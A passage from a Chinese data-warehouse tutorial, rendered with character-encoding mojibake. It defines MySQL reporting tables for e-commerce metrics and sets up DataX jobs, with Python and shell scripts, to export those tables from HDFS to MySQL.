â€˜è·³è½¬ç»ˆåˆ°é¡µé¢IDâ€™,</p><p>`path_count` bigint(20) NULL DEFAULT NULL COMMENT â€˜è·³è½¬æ¬¡æ•°â€™,</p><p>PRIMARY KEY (`dt`, `recent_days`, `source`, `target`) USING BTREE</p><p>) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT =<br>â€˜é¡µé¢æµè§ˆè·¯å¾„åˆ†æâ€™ ROW_FORMAT = Dynamic;</p><p><strong>6ï¼‰å„å“ç‰Œå¤è´­ç‡</strong></p><p>DROP TABLE IF EXISTS `ads_repeat_purchase_by_tm`;</p><p>CREATE TABLE `ads_repeat_purchase_by_tm` (</p><p>`dt` date NOT NULL COMMENT â€˜ç»Ÿè®¡æ—¥æœŸâ€™,</p><p>`recent_days` bigint(20) NOT NULL COMMENT â€˜æœ€è¿‘å¤©æ•°,7:æœ€è¿‘7å¤©,30:æœ€è¿‘30å¤©â€™,</p><p>`tm_id` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL<br>COMMENT â€˜å“ç‰ŒIDâ€™,</p><p>`tm_name` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT<br>NULL COMMENT â€˜å“ç‰Œåç§°â€™,</p><p>`order_repeat_rate` decimal(16, 2) NULL DEFAULT NULL COMMENT â€˜å¤è´­ç‡â€™,</p><p>PRIMARY KEY (`dt`, `recent_days`, `tm_id`) USING BTREE</p><p>) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT =<br>â€˜å„å“ç‰Œå¤è´­ç‡ç»Ÿè®¡â€™ ROW_FORMAT = Dynamic;</p><p><strong>7ï¼‰å„å“ç±»å•†å“è´­ç‰©è½¦å­˜é‡topN</strong></p><p>DROP TABLE IF EXISTS `ads_sku_cart_num_top3_by_cate`;</p><p>CREATE TABLE `ads_sku_cart_num_top3_by_cate` (</p><p>`dt` date NOT NULL COMMENT â€˜ç»Ÿè®¡æ—¥æœŸâ€™,</p><p>`category1_id` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL<br>COMMENT â€˜ä¸€çº§åˆ†ç±»IDâ€™,</p><p>`category1_name` varchar(64) CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>DEFAULT NULL COMMENT â€˜ä¸€çº§åˆ†ç±»åç§°â€™,</p><p>`category2_id` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL<br>COMMENT â€˜äºŒçº§åˆ†ç±»IDâ€™,</p><p>`category2_name` varchar(64) CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>DEFAULT NULL COMMENT â€˜äºŒçº§åˆ†ç±»åç§°â€™,</p><p>`category3_id` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL<br>COMMENT â€˜ä¸‰çº§åˆ†ç±»IDâ€™,</p><p>`category3_name` varchar(64) CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>DEFAULT NULL COMMENT â€˜ä¸‰çº§åˆ†ç±»åç§°â€™,</p><p>`sku_id` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL<br>COMMENT â€˜å•†å“idâ€™,</p><p>`sku_name` varchar(128) CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>DEFAULT NULL COMMENT â€˜å•†å“åç§°â€™,</p><p>`cart_num` bigint(20) NULL DEFAULT NULL COMMENT â€˜è´­ç‰©è½¦ä¸­å•†å“æ•°é‡â€™,</p><p>`rk` bigint(20) NULL DEFAULT NULL COMMENT â€˜æ’åâ€™,</p><p>PRIMARY KEY (`dt`, `sku_id`, `category1_id`, `category2_id`,<br>`category3_id`) USING BTREE</p><p>) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT =<br>â€˜å„åˆ†ç±»å•†å“è´­ç‰©è½¦å­˜é‡Top10â€™ ROW_FORMAT = Dynamic;</p><p><strong>8ï¼‰äº¤æ˜“ç»¼åˆç»Ÿè®¡</strong></p><p>DROP TABLE IF EXISTS `ads_trade_stats`;</p><p>CREATE TABLE `ads_trade_stats` (</p><p>`dt` date NOT NULL COMMENT â€˜ç»Ÿè®¡æ—¥æœŸâ€™,</p><p>`recent_days` bigint(255) NOT NULL COMMENT<br>â€˜æœ€è¿‘å¤©æ•°,1:æœ€è¿‘1æ—¥,7:æœ€è¿‘7å¤©,30:æœ€è¿‘30å¤©â€™,</p><p>`order_total_amount` decimal(16, 2) NULL DEFAULT NULL COMMENT â€˜è®¢å•æ€»é¢,GMVâ€™,</p><p>`order_count` bigint(20) NULL DEFAULT NULL COMMENT â€˜è®¢å•æ•°â€™,</p><p>`order_user_count` bigint(20) NULL DEFAULT NULL COMMENT â€˜ä¸‹å•äººæ•°â€™,</p><p>`order_refund_count` bigint(20) NULL DEFAULT NULL COMMENT â€˜é€€å•æ•°â€™,</p><p>`order_refund_user_count` bigint(20) NULL DEFAULT NULL COMMENT â€˜é€€å•äººæ•°â€™,</p><p>PRIMARY KEY (`dt`, `recent_days`) USING BTREE</p><p>) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT =<br>â€˜äº¤æ˜“ç»Ÿè®¡â€™ ROW_FORMAT = Dynamic;</p><p><strong>9ï¼‰å„å“ç±»å•†å“äº¤æ˜“ç»Ÿè®¡</strong></p><p>DROP TABLE IF EXISTS `ads_trade_stats_by_cate`;</p><p>CREATE TABLE `ads_trade_stats_by_cate` (</p><p>`dt` date NOT NULL COMMENT â€˜ç»Ÿè®¡æ—¥æœŸâ€™,</p><p>`recent_days` bigint(20) NOT NULL COMMENT<br>â€˜æœ€è¿‘å¤©æ•°,1:æœ€è¿‘1å¤©,7:æœ€è¿‘7å¤©,30:æœ€è¿‘30å¤©â€™,</p><p>`category1_id` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL<br>COMMENT â€˜ä¸€çº§åˆ†ç±»idâ€™,</p><p>`category1_name` varchar(64) CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>DEFAULT NULL COMMENT â€˜ä¸€çº§åˆ†ç±»åç§°â€™,</p><p>`category2_id` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL<br>COMMENT â€˜äºŒçº§åˆ†ç±»idâ€™,</p><p>`category2_name` varchar(64) CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>DEFAULT NULL COMMENT â€˜äºŒçº§åˆ†ç±»åç§°â€™,</p><p>`category3_id` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL<br>COMMENT â€˜ä¸‰çº§åˆ†ç±»idâ€™,</p><p>`category3_name` varchar(64) CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>DEFAULT NULL COMMENT â€˜ä¸‰çº§åˆ†ç±»åç§°â€™,</p><p>`order_count` bigint(20) NULL DEFAULT NULL COMMENT â€˜è®¢å•æ•°â€™,</p><p>`order_user_count` bigint(20) NULL DEFAULT NULL COMMENT â€˜è®¢å•äººæ•°â€™,</p><p>`order_refund_count` bigint(20) NULL DEFAULT NULL COMMENT â€˜é€€å•æ•°â€™,</p><p>`order_refund_user_count` bigint(20) NULL DEFAULT NULL COMMENT â€˜é€€å•äººæ•°â€™,</p><p>PRIMARY KEY (`dt`, `recent_days`, `category1_id`, `category2_id`,<br>`category3_id`) USING BTREE</p><p>) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT =<br>â€˜å„åˆ†ç±»å•†å“äº¤æ˜“ç»Ÿè®¡â€™ ROW_FORMAT = Dynamic;</p><p><strong>10ï¼‰å„å“ç‰Œå•†å“äº¤æ˜“ç»Ÿè®¡</strong></p><p>DROP TABLE IF EXISTS `ads_trade_stats_by_tm`;</p><p>CREATE TABLE `ads_trade_stats_by_tm` (</p><p>`dt` date NOT NULL COMMENT â€˜ç»Ÿè®¡æ—¥æœŸâ€™,</p><p>`recent_days` bigint(20) NOT NULL COMMENT<br>â€˜æœ€è¿‘å¤©æ•°,1:æœ€è¿‘1å¤©,7:æœ€è¿‘7å¤©,30:æœ€è¿‘30å¤©â€™,</p><p>`tm_id` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL<br>COMMENT â€˜å“ç‰ŒIDâ€™,</p><p>`tm_name` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT<br>NULL COMMENT â€˜å“ç‰Œåç§°â€™,</p><p>`order_count` bigint(20) NULL DEFAULT NULL COMMENT â€˜è®¢å•æ•°â€™,</p><p>`order_user_count` bigint(20) NULL DEFAULT NULL COMMENT â€˜è®¢å•äººæ•°â€™,</p><p>`order_refund_count` bigint(20) NULL DEFAULT NULL COMMENT â€˜é€€å•æ•°â€™,</p><p>`order_refund_user_count` bigint(20) NULL DEFAULT NULL COMMENT â€˜é€€å•äººæ•°â€™,</p><p>PRIMARY KEY (`dt`, `recent_days`, `tm_id`) USING BTREE</p><p>) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT =<br>â€˜å„å“ç‰Œå•†å“äº¤æ˜“ç»Ÿè®¡â€™ ROW_FORMAT = Dynamic;</p><p><strong>11ï¼‰å„æ¸ é“æµé‡ç»Ÿè®¡</strong></p><p>DROP TABLE IF EXISTS `ads_traffic_stats_by_channel`;</p><p>CREATE TABLE `ads_traffic_stats_by_channel` (</p><p>`dt` date NOT NULL COMMENT â€˜ç»Ÿè®¡æ—¥æœŸâ€™,</p><p>`recent_days` bigint(20) NOT NULL COMMENT<br>â€˜æœ€è¿‘å¤©æ•°,1:æœ€è¿‘1å¤©,7:æœ€è¿‘7å¤©,30:æœ€è¿‘30å¤©â€™,</p><p>`channel` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL<br>COMMENT â€˜æ¸ é“â€™,</p><p>`uv_count` bigint(20) NULL DEFAULT NULL COMMENT â€˜è®¿å®¢äººæ•°â€™,</p><p>`avg_duration_sec` bigint(20) NULL DEFAULT NULL COMMENT<br>â€˜ä¼šè¯å¹³å‡åœç•™æ—¶é•¿ï¼Œå•ä½ä¸ºç§’â€™,</p><p>`avg_page_count` bigint(20) NULL DEFAULT NULL COMMENT â€˜ä¼šè¯å¹³å‡æµè§ˆé¡µé¢æ•°â€™,</p><p>`sv_count` bigint(20) NULL DEFAULT NULL COMMENT â€˜ä¼šè¯æ•°â€™,</p><p>`bounce_rate` decimal(16, 2) NULL DEFAULT NULL COMMENT â€˜è·³å‡ºç‡â€™,</p><p>PRIMARY KEY (`dt`, `recent_days`, `channel`) USING BTREE</p><p>) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT =<br>â€˜å„æ¸ é“æµé‡ç»Ÿè®¡â€™ ROW_FORMAT = Dynamic;</p><p><strong>12ï¼‰ç”¨æˆ·è¡Œä¸ºæ¼æ–—åˆ†æ</strong></p><p>DROP TABLE IF EXISTS `ads_user_action`;</p><p>CREATE TABLE `ads_user_action` (</p><p>`dt` date NOT NULL COMMENT â€˜ç»Ÿè®¡æ—¥æœŸâ€™,</p><p>`recent_days` bigint(20) NOT NULL COMMENT<br>â€˜æœ€è¿‘å¤©æ•°,1:æœ€è¿‘1å¤©,7:æœ€è¿‘7å¤©,30:æœ€è¿‘30å¤©â€™,</p><p>`home_count` bigint(20) NULL DEFAULT NULL COMMENT â€˜æµè§ˆé¦–é¡µäººæ•°â€™,</p><p>`good_detail_count` bigint(20) NULL DEFAULT NULL COMMENT â€˜æµè§ˆå•†å“è¯¦æƒ…é¡µäººæ•°â€™,</p><p>`cart_count` bigint(20) NULL DEFAULT NULL COMMENT â€˜åŠ å…¥è´­ç‰©è½¦äººæ•°â€™,</p><p>`order_count` bigint(20) NULL DEFAULT NULL COMMENT â€˜ä¸‹å•äººæ•°â€™,</p><p>`payment_count` bigint(20) NULL DEFAULT NULL COMMENT â€˜æ”¯ä»˜äººæ•°â€™,</p><p>PRIMARY KEY (`dt`, `recent_days`) USING BTREE</p><p>) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT =<br>â€˜æ¼æ–—åˆ†æâ€™ ROW_FORMAT = Dynamic;</p><p><strong>13ï¼‰ç”¨æˆ·å˜åŠ¨ç»Ÿè®¡</strong></p><p>DROP TABLE IF EXISTS `ads_user_change`;</p><p>CREATE TABLE `ads_user_change` (</p><p>`dt` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT<br>â€˜ç»Ÿè®¡æ—¥æœŸâ€™,</p><p>`user_churn_count` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>DEFAULT NULL COMMENT â€˜æµå¤±ç”¨æˆ·æ•°â€™,</p><p>`user_back_count` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NULL<br>DEFAULT NULL COMMENT â€˜å›æµç”¨æˆ·æ•°â€™,</p><p>PRIMARY KEY (`dt`) USING BTREE</p><p>) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT =<br>â€˜ç”¨æˆ·å˜åŠ¨ç»Ÿè®¡â€™ ROW_FORMAT = Dynamic;</p><p><strong>14ï¼‰ç”¨æˆ·ç•™å­˜ç‡</strong></p><p>DROP TABLE IF EXISTS `ads_user_retention`;</p><p>CREATE TABLE `ads_user_retention` (</p><p>`dt` date NOT NULL COMMENT â€˜ç»Ÿè®¡æ—¥æœŸâ€™,</p><p>`create_date` varchar(16) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL<br>COMMENT â€˜ç”¨æˆ·æ–°å¢æ—¥æœŸâ€™,</p><p>`retention_day` int(20) NOT NULL COMMENT â€˜æˆªè‡³å½“å‰æ—¥æœŸç•™å­˜å¤©æ•°â€™,</p><p>`retention_count` bigint(20) NULL DEFAULT NULL COMMENT â€˜ç•™å­˜ç”¨æˆ·æ•°é‡â€™,</p><p>`new_user_count` bigint(20) NULL DEFAULT NULL COMMENT â€˜æ–°å¢ç”¨æˆ·æ•°é‡â€™,</p><p>`retention_rate` decimal(16, 2) NULL DEFAULT NULL COMMENT â€˜ç•™å­˜ç‡â€™,</p><p>PRIMARY KEY (`dt`, `create_date`, `retention_day`) USING BTREE</p><p>) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT =<br>â€˜ç•™å­˜ç‡â€™ ROW_FORMAT = Dynamic;</p><p><strong>15ï¼‰ç”¨æˆ·æ–°å¢æ´»è·ƒç»Ÿè®¡</strong></p><p>DROP TABLE IF EXISTS `ads_user_stats`;</p><p>CREATE TABLE `ads_user_stats` (</p><p>`dt` date NOT NULL COMMENT â€˜ç»Ÿè®¡æ—¥æœŸâ€™,</p><p>`recent_days` bigint(20) NOT NULL COMMENT<br>â€˜æœ€è¿‘næ—¥,1:æœ€è¿‘1æ—¥,7:æœ€è¿‘7æ—¥,30:æœ€è¿‘30æ—¥â€™,</p><p>`new_user_count` bigint(20) NULL DEFAULT NULL COMMENT â€˜æ–°å¢ç”¨æˆ·æ•°â€™,</p><p>`active_user_count` bigint(20) NULL DEFAULT NULL COMMENT â€˜æ´»è·ƒç”¨æˆ·æ•°â€™,</p><p>PRIMARY KEY (`dt`, `recent_days`) USING BTREE</p><p>) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT =<br>â€˜ç”¨æˆ·æ–°å¢æ´»è·ƒç»Ÿè®¡â€™ ROW_FORMAT = Dynamic;</p><h3 id="æ•°æ®å¯¼å‡º"><a href="#æ•°æ®å¯¼å‡º" class="headerlink" title="æ•°æ®å¯¼å‡º"></a>æ•°æ®å¯¼å‡º</h3><p>æ•°æ®å¯¼å‡ºå·¥å…·é€‰ç”¨DataXï¼Œé€‰ç”¨HDFSReaderå’ŒMySQLWriterã€‚</p><h4 id="ç¼–å†™DataXé…ç½®æ–‡ä»¶"><a href="#ç¼–å†™DataXé…ç½®æ–‡ä»¶" class="headerlink" title="ç¼–å†™DataXé…ç½®æ–‡ä»¶"></a>ç¼–å†™DataXé…ç½®æ–‡ä»¶</h4><p>æˆ‘ä»¬éœ€è¦ä¸ºæ¯ä¸ªå¼ è¡¨ç¼–å†™ä¸€ä¸ªDataXé…ç½®æ–‡ä»¶ï¼Œæ­¤å¤„ä»¥ads_traffic_stats_by_channelä¸ºä¾‹ï¼Œé…ç½®æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p><p>{</p><p>â€œjobâ€: {</p><p>â€œcontentâ€: [</p><p>{</p><p>â€œreaderâ€: {</p><p>â€œnameâ€: â€œhdfsreaderâ€,</p><p>â€œparameterâ€: {</p><p>â€œcolumnâ€: [</p><p>â€œ*â€œ</p><p>],</p><p>â€œdefaultFSâ€: â€œhdfs://hadoop102:8020â€,</p><p>â€œencodingâ€: â€œUTF-8â€,</p><p>â€œfieldDelimiterâ€: â€œ\tâ€,</p><p>â€œfileTypeâ€: â€œtextâ€,</p><p>â€œnullFormatâ€: â€œ\\Nâ€,</p><p>â€œpathâ€: â€œ<strong>${exportdir}</strong>â€œ</p><p>}</p><p>},</p><p>â€œwriterâ€: {</p><p>â€œnameâ€: â€œmysqlwriterâ€,</p><p>â€œparameterâ€: {</p><p>â€œcolumnâ€: [</p><p>â€œdtâ€,</p><p>â€œrecent_daysâ€,</p><p>â€œchannelâ€,</p><p>â€œuv_countâ€,</p><p>â€œavg_duration_secâ€,</p><p>â€œavg_page_countâ€,</p><p>â€œsv_countâ€,</p><p>â€œbounce_rateâ€</p><p>],</p><p>â€œconnectionâ€: [</p><p>{</p><p>â€œjdbcUrlâ€:<br>â€œjdbc:mysql://hadoop102:3306/gmall_report?useUnicode=true&amp;characterEncoding=utf-8â€,</p><p>â€œtableâ€: [</p><p>â€œads_traffic_stats_by_channelâ€</p><p>]</p><p>}</p><p>],</p><p>â€œpasswordâ€: â€œ000000â€,</p><p>â€œusernameâ€: â€œrootâ€,</p><p>â€œwriteModeâ€: â€œreplaceâ€</p><p>}</p><p>}</p><p>}</p><p>],</p><p>â€œsettingâ€: {</p><p>â€œerrorLimitâ€: {</p><p>â€œpercentageâ€: 0.02,</p><p>â€œrecordâ€: 0</p><p>},</p><p>â€œspeedâ€: {</p><p>â€œchannelâ€: 3</p><p>}</p><p>}</p><p>}</p><p>}</p><p>æ³¨ï¼šå¯¼å‡ºè·¯å¾„pathå‚æ•°å¹¶æœªå†™æ­»ï¼Œéœ€åœ¨æäº¤ä»»åŠ¡æ—¶é€šè¿‡å‚æ•°åŠ¨æ€ä¼ å…¥ï¼Œå‚æ•°åç§°ä¸ºexportdirã€‚</p><h4 id="DataXé…ç½®æ–‡ä»¶ç”Ÿæˆè„šæœ¬"><a href="#DataXé…ç½®æ–‡ä»¶ç”Ÿæˆè„šæœ¬" class="headerlink" title="DataXé…ç½®æ–‡ä»¶ç”Ÿæˆè„šæœ¬"></a>DataXé…ç½®æ–‡ä»¶ç”Ÿæˆè„šæœ¬</h4><p>æ–¹ä¾¿èµ·è§ï¼Œæ­¤å¤„æä¾›äº†DataXé…ç½®æ–‡ä»¶æ‰¹é‡ç”Ÿæˆè„šæœ¬ï¼Œè„šæœ¬å†…å®¹åŠä½¿ç”¨æ–¹å¼å¦‚ä¸‹ã€‚</p><p><strong>1ï¼‰åœ¨~/binç›®å½•ä¸‹åˆ›å»ºgen_export_config.pyè„šæœ¬</strong></p><p>[atguigu@hadoop102 bin]$ vim ~/bin/gen_export_config.py</p><p>è„šæœ¬å†…å®¹å¦‚ä¸‹</p><p>## coding=utf-8</p><p>import json</p><p>import getopt</p><p>import os</p><p>import sys</p><p>import MySQLdb</p><p>##MySQLç›¸å…³é…ç½®ï¼Œéœ€æ ¹æ®å®é™…æƒ…å†µä½œå‡ºä¿®æ”¹</p><p>mysql_host = â€œhadoop102â€</p><p>mysql_port = â€œ3306â€</p><p>mysql_user = â€œrootâ€</p><p>mysql_passwd = â€œ000000â€</p><p>##HDFS NameNodeç›¸å…³é…ç½®ï¼Œéœ€æ ¹æ®å®é™…æƒ…å†µä½œå‡ºä¿®æ”¹</p><p>hdfs_nn_host = â€œhadoop102â€</p><p>hdfs_nn_port = â€œ8020â€</p><p>##ç”Ÿæˆé…ç½®æ–‡ä»¶çš„ç›®æ ‡è·¯å¾„ï¼Œå¯æ ¹æ®å®é™…æƒ…å†µä½œå‡ºä¿®æ”¹</p><p>output_path = â€œ/opt/module/datax/job/exportâ€</p><p>def get_connection():</p><p>return MySQLdb.connect(host=mysql_host, port=int(mysql_port), user=mysql_user,<br>passwd=mysql_passwd)</p><p>def get_mysql_meta(database, table):</p><p>connection = get_connection()</p><p>cursor = connection.cursor()</p><p>sql = â€œSELECT COLUMN_NAME,DATA_TYPE from information_schema.COLUMNS WHERE<br>TABLE_SCHEMA=%s AND TABLE_NAME=%s ORDER BY ORDINAL_POSITIONâ€</p><p>cursor.execute(sql, [database, table])</p><p>fetchall = cursor.fetchall()</p><p>cursor.close()</p><p>connection.close()</p><p>return fetchall</p><p>def get_mysql_columns(database, table):</p><p>return map(lambda x: x[0], get_mysql_meta(database, table))</p><p>def generate_json(target_database, target_table):</p><p>job = {</p><p>â€œjobâ€: {</p><p>â€œsettingâ€: {</p><p>â€œspeedâ€: {</p><p>â€œchannelâ€: 3</p><p>},</p><p>â€œerrorLimitâ€: {</p><p>â€œrecordâ€: 0,</p><p>â€œpercentageâ€: 0.02</p><p>}</p><p>},</p><p>â€œcontentâ€: [{</p><p>â€œreaderâ€: {</p><p>â€œnameâ€: â€œhdfsreaderâ€,</p><p>â€œparameterâ€: {</p><p>â€œpathâ€: â€œ${exportdir}â€,</p><p>â€œdefaultFSâ€: â€œhdfs://â€œ + hdfs_nn_host + â€œ:â€ + hdfs_nn_port,</p><p>â€œcolumnâ€: [â€œ*â€œ],</p><p>â€œfileTypeâ€: â€œtextâ€,</p><p>â€œencodingâ€: â€œUTF-8â€,</p><p>â€œfieldDelimiterâ€: â€œ\tâ€,</p><p>â€œnullFormatâ€: â€œ\\Nâ€</p><p>}</p><p>},</p><p>â€œwriterâ€: {</p><p>â€œnameâ€: â€œmysqlwriterâ€,</p><p>â€œparameterâ€: {</p><p>â€œwriteModeâ€: â€œreplaceâ€,</p><p>â€œusernameâ€: mysql_user,</p><p>â€œpasswordâ€: mysql_passwd,</p><p>â€œcolumnâ€: get_mysql_columns(target_database, target_table),</p><p>â€œconnectionâ€: [</p><p>{</p><p>â€œjdbcUrlâ€:</p><p>â€œjdbc:mysql://â€œ + mysql_host + â€œ:â€ + mysql_port + â€œ/â€œ + target_database +<br>â€œ?useUnicode=true&amp;characterEncoding=utf-8â€,</p><p>â€œtableâ€: [target_table]</p><p>}</p><p>]</p><p>}</p><p>}</p><p>}]</p><p>}</p><p>}</p><p>if not os.path.exists(output_path):</p><p>os.makedirs(output_path)</p><p>with open(os.path.join(output_path, â€œ.â€.join([target_database, target_table,<br>â€œjsonâ€])), â€œwâ€) as f:</p><p>json.dump(job, f)</p><p>def main(args):</p><p>target_database = â€œâ€</p><p>target_table = â€œâ€</p><p>options, arguments = getopt.getopt(args, â€˜-d:-t:â€™, [â€˜targetdb=â€™, â€˜targettbl=â€™])</p><p>for opt_name, opt_value in options:</p><p>if opt_name in (â€˜-dâ€™, â€˜â€“targetdbâ€™):</p><p>target_database = opt_value</p><p>if opt_name in (â€˜-tâ€™, â€˜â€“targettblâ€™):</p><p>target_table = opt_value</p><p>generate_json(target_database, target_table)</p><p>if _<em>name</em>_ == â€˜<strong>main</strong>â€˜:</p><p>main(sys.argv[1:])</p><p><strong>æ³¨ï¼š</strong></p><p><strong>ï¼ˆ1ï¼‰å®‰è£…Python Mysqlé©±åŠ¨</strong></p><p><strong>ç”±äºéœ€è¦ä½¿ç”¨Pythonè®¿é—®Mysqlæ•°æ®åº“ï¼Œæ•…éœ€å®‰è£…é©±åŠ¨ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</strong></p><p>[atguigu@hadoop102 bin]$ sudo yum install -y MySQL-python</p><p><strong>ï¼ˆ2ï¼‰è„šæœ¬ä½¿ç”¨è¯´æ˜</strong></p><p>python gen_export_config.py <strong>-d</strong> database <strong>-t</strong> table</p><p>é€šè¿‡-dä¼ å…¥MySQLæ•°æ®åº“åï¼Œ-tä¼ å…¥MySQLè¡¨åï¼Œæ‰§è¡Œä¸Šè¿°å‘½ä»¤å³å¯ç”Ÿæˆè¯¥è¡¨çš„DataXåŒæ­¥é…ç½®æ–‡ä»¶ã€‚</p><p><strong>2ï¼‰åœ¨~/binç›®å½•ä¸‹åˆ›å»ºgen_export_config.shè„šæœ¬</strong></p><p>[atguigu@hadoop102 bin]$ vim ~/bin/gen_export_config.sh</p><p>è„šæœ¬å†…å®¹å¦‚ä¸‹</p><p>##!/bin/bash</p><p>python ~/bin/gen_export_config.py -d gmall_report -t ads_activity_stats</p><p>python ~/bin/gen_export_config.py -d gmall_report -t ads_coupon_stats</p><p>python ~/bin/gen_export_config.py -d gmall_report -t ads_new_buyer_stats</p><p>python ~/bin/gen_export_config.py -d gmall_report -t ads_order_by_province</p><p>python ~/bin/gen_export_config.py -d gmall_report -t ads_page_path</p><p>python ~/bin/gen_export_config.py -d gmall_report -t ads_repeat_purchase_by_tm</p><p>python ~/bin/gen_export_config.py -d gmall_report -t<br>ads_sku_cart_num_top3_by_cate</p><p>python ~/bin/gen_export_config.py -d gmall_report -t ads_trade_stats</p><p>python ~/bin/gen_export_config.py -d gmall_report -t ads_trade_stats_by_cate</p><p>python ~/bin/gen_export_config.py -d gmall_report -t ads_trade_stats_by_tm</p><p>python ~/bin/gen_export_config.py -d gmall_report -t<br>ads_traffic_stats_by_channel</p><p>python ~/bin/gen_export_config.py -d gmall_report -t ads_user_action</p><p>python ~/bin/gen_export_config.py -d gmall_report -t ads_user_change</p><p>python ~/bin/gen_export_config.py -d gmall_report -t ads_user_retention</p><p>python ~/bin/gen_export_config.py -d gmall_report -t ads_user_stats</p><p><strong>3ï¼‰ä¸ºgen_export_config.shè„šæœ¬å¢åŠ æ‰§è¡Œæƒé™</strong></p><p>[atguigu@hadoop102 bin]$ chmod +x ~/bin/gen_export_config.sh</p><p><strong>4ï¼‰æ‰§è¡Œgen_export_config.shè„šæœ¬ï¼Œç”Ÿæˆé…ç½®æ–‡ä»¶</strong></p><p>[atguigu@hadoop102 bin]$ gen_export_config.sh</p><p><strong>5ï¼‰è§‚å¯Ÿç”Ÿæˆçš„é…ç½®æ–‡ä»¶</strong></p><p>[atguigu@hadoop102 bin]$ ls /opt/module/datax/job/export/</p><p>æ€»ç”¨é‡ 64</p><p>gmall_report.ads_activity_stats.json gmall_report.ads_trade_stats_by_cate.json</p><p>gmall_report.ads_coupon_stats.json gmall_report.ads_trade_stats_by_tm.json</p><p>gmall_report.ads_new_buyer_stats.json gmall_report.ads_trade_stats.json</p><p>gmall_report.ads_order_by_province.json<br>gmall_report.ads_traffic_stats_by_channel.json</p><p>gmall_report.ads_user_action.json</p><p>gmall_report.ads_page_path.json gmall_report.ads_user_change.json</p><p>gmall_report.ads_repeat_purchase_by_tm.json gmall_report.ads_user_retention.json</p><p>gmall_report.ads_sku_cart_num_top3_by_cate.json gmall_report.ads_user_stats.json</p><h4 id="æµ‹è¯•ç”Ÿæˆçš„DataXé…ç½®æ–‡ä»¶"><a href="#æµ‹è¯•ç”Ÿæˆçš„DataXé…ç½®æ–‡ä»¶" class="headerlink" title="æµ‹è¯•ç”Ÿæˆçš„DataXé…ç½®æ–‡ä»¶"></a>æµ‹è¯•ç”Ÿæˆçš„DataXé…ç½®æ–‡ä»¶</h4><p>ä»¥ads_traffic_stats_by_channelä¸ºä¾‹ï¼Œæµ‹è¯•ç”¨è„šæœ¬ç”Ÿæˆçš„é…ç½®æ–‡ä»¶æ˜¯å¦å¯ç”¨ã€‚</p><p><strong>1ï¼‰æ‰§è¡ŒDataXåŒæ­¥å‘½ä»¤</strong></p><p>[atguigu@hadoop102 bin]$ python /opt/module/datax/bin/datax.py<br>-pâ€-Dexportdir=/warehouse/gmall/ads/ads_traffic_stats_by_channelâ€<br>/opt/module/datax/job/export/gmall_report.ads_traffic_stats_by_channel.json</p><p><strong>2ï¼‰è§‚å¯ŸåŒæ­¥ç»“æœ</strong></p><p>è§‚å¯ŸMySQLç›®æ ‡è¡¨æ˜¯å¦å‡ºç°æ•°æ®ã€‚</p><h4 id="ç¼–å†™æ¯æ—¥å¯¼å‡ºè„šæœ¬"><a href="#ç¼–å†™æ¯æ—¥å¯¼å‡ºè„šæœ¬" class="headerlink" title="ç¼–å†™æ¯æ—¥å¯¼å‡ºè„šæœ¬"></a>ç¼–å†™æ¯æ—¥å¯¼å‡ºè„šæœ¬</h4><p>ï¼ˆ1ï¼‰åœ¨hadoop102çš„/home/atguigu/binç›®å½•ä¸‹åˆ›å»ºhdfs_to_mysql.sh</p><p>[atguigu@hadoop102 bin]$ vim hdfs_to_mysql.sh</p><p>ï¼ˆ2ï¼‰ç¼–å†™å¦‚ä¸‹å†…å®¹</p><p>##! /bin/bash</p><p>DATAX_HOME=/opt/module/datax</p><p>##DataXå¯¼å‡ºè·¯å¾„ä¸å…è®¸å­˜åœ¨ç©ºæ–‡ä»¶ï¼Œè¯¥å‡½æ•°ä½œç”¨ä¸ºæ¸…ç†ç©ºæ–‡ä»¶</p><p>handle_export_path(){</p><p>for i in `hadoop fs -ls -R $1 | awk â€˜{print $8}â€™`; do</p><p>hadoop fs -test -z $i</p><p>if [[ $? -eq 0 ]]; then</p><p>echo â€œ$iæ–‡ä»¶å¤§å°ä¸º0ï¼Œæ­£åœ¨åˆ é™¤â€</p><p>hadoop fs -rm -r -f 